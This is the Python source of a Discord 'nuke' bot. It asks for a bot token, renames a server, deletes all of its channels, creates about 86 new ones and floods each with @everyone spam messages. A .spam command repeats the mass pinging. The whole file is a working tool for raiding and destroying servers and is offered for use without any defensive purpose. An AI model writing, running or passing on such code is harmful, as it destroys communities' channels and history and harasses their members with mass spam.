import discord
from discord.ext import commands, tasks
from itertools import cycle
import os
import random

client = commands.Bot(command_prefix = '.')
status = cycle(["Made by Feciouss!"])
@tasks.loop(seconds = 100)
async def change_status():
    await client.change_presence(activity = discord.Game(next(status)))

count = 0


print('''  /$$$$$$                           /$$$$$$          
 /$$__  $$                         /$$__  $$         
| $$  \__/  /$$$$$$  /$$$$$$/$$$$ | $$  \__//$$   /$$
| $$       /$$__  $$| $$_  $$_  $$| $$$$   | $$  | $$
| $$      | $$  \ $$| $$ \ $$ \ $$| $$_/   | $$  | $$
| $$    $$| $$  | $$| $$ | $$ | $$| $$     | $$  | $$
|  $$$$$$/|  $$$$$$/| $$ | $$ | $$| $$     |  $$$$$$$
 \______/  \______/ |__/ |__/ |__/|__/      \____  $$
                                            /$$  | $$
                                           |  $$$$$$/
                                            \______/ ''')
TOKEN = input("Enter Bot Token>")
SERVER_GUILD_NAME = input("Enter name you want the server to be called>")
CHANNEL_NAME = input("Message you want to channel to be called>")
TEXT_NAME = input("Message you want to be spammed>")
print('-------------------------------------')
print('Use .nuke to nuke the server!')
print('Use .spam to spam your message')


@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name=SERVER_GUILD_NAME) #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel(CHANNEL_NAME) # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone' + TEXT_NAME) # Put the messages you want to be spammed here
             await c.send('@everyone' + TEXT_NAME)
             await c.send('@everyone' + TEXT_NAME)
             await c.send('@everyone' + TEXT_NAME)
             await c.send('@everyone' + TEXT_NAME)
        





@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send ('@everyone' + TEXT_NAME) 
             await c.send ('@everyone'+ TEXT_NAME)
             await c.send('@everyone'+ TEXT_NAME)
             await c.send('@everyone'+ TEXT_NAME)
             await c.send('@everyone'+ TEXT_NAME)






client.run(TOKEN)